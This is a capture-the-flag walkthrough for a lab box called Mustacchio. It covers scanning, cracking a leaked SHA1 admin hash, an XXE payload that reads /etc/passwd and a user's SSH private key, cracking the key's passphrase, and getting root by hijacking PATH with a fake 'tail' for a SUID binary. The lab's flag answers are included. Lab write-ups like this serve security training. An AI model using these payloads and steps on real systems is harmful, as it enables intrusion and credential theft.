# Mustacchio - Easy

```shell
rustscan -a 10.10.50.119 --range 0-65535 --ulimit 5000 -- -sV

feroxbuster -u http://10.10.50.119 -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip --extract-links --scan-limit 2 --filter-status 401,403,404,405,500 --silent

feroxbuster -u http://10.10.50.119:8765 -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip --extract-links --scan-limit 2 --filter-status 401,403,404,405,500 --silent

vim id_rsa
#copy Barry's private SSH key

chmod 600 id_rsa

#use ssh2john to get passphrase for key
ssh2john id_rsa > hash_id_rsa

john --wordlist=/usr/share/wordlists/rockyou.txt hash_id_rsa

ssh barry@10.10.50.119 -i id_rsa

#get user flag
cat user.txt

ls /home
#there is another user

cd /home/joe

ls -la /home/joe
#SUID bit set

file live_log

strings live_log

export PATH=/tmp:$PATH

echo $PATH

echo '#!/bin/bash
/bin/bash -i' > /tmp/tail

chmod +x /tmp/tail

./live_log
#run binary to get root shell
```

```markdown
Open ports & services:

  * 22 - ssh - OpenSSH 7.2p2 (Ubuntu)
  * 80 - http - Apache httpd 2.4.18
  * 8765 - http - nginx 1.10.3 (Ubuntu)

We can start by exploring both websites on ports 80 and 8765, and simultaneously attempt to enumerate the web directories.

For the webpage on port 80, pages of interest include the /contact.html as it accepts user input; the /custom directory has some files in it.

Now, in the /custom/js directory, we find a file named users.bak; when viewed, it contains SQL commands for a user table with the following string:

    admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b

This could be the hash for a password; using online services, we can find that it is a SHA1 hash and when cracked, it gives us the password 'bulldog19'.

So now, we have the creds admin:bulldog19; and there is a login page at port 8765, so we can use them there.

This gives us access to the admin panel for the website, and we are allowed to add a comment on the website.

Furthermore, the source code for the admin panel webpage contains a couple of hints:

  * There is a comment left for a user 'Barry', saying that they can SSH using their key
  * There is a directory path given - /auth/dontforget.bak

Now the dontforget.bak file contains XML code;; while the content is not useful, we can try to insert this into the textbox and press 'Submit'.

This gives us a comment preview with the Name, Author and the Comment field.

So, we can misuse this by attempting to exploit a XML-XXE vulnerability; we can refer to payloads from Google.

We can modify the payload accordingly so that it prints /etc/password file; the XML code should be URL-encoded before submitting.
```

```xml
<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f>
<!DOCTYPE+root+[<!ENTITY+example+SYSTEM+"file%3a///etc/passwd">+]>
<comment>
++<name>%26example%3b</name>
++<author>Barry+Clad</author>
++<com>Some+comment+text</com>
</comment>
```

```markdown
This payload prints the /etc/passwd file; so now we can try to get Barry's SSH keys so that we can connect via SSH.

By replacing /etc/passwd and using the path '/home/barry/.ssh/id_rsa', we can copy the private key to our system, change its permissions and use it for SSH login.

To get the passphrase for the key, we can use ssh2john tool; this gives us the passphrase 'urieljames'.

Now, after logging into SSH and getting user flag, we can start to enumerate the system.

There is another user 'joe' in the system; checking the files in /home/joe, we can see that there is a binary which is run by root, and has the SUID bit set.

Going through the binary by using strings, we can see that it uses the 'tail' binary; we can misuse this by creating a 'tail' program of our own, modifying the path and running the binary to give us root shell.

After modifying path, and creating /tmp/tail, giving it executable permissions, we can run live_log; this gives us root shell.
```

1. What is the user flag? - 62d77a4d5f97d47c5aa38b3b2651b831

2. What is the root flag? - 3223581420d906c4dd1a5f9b530393a5
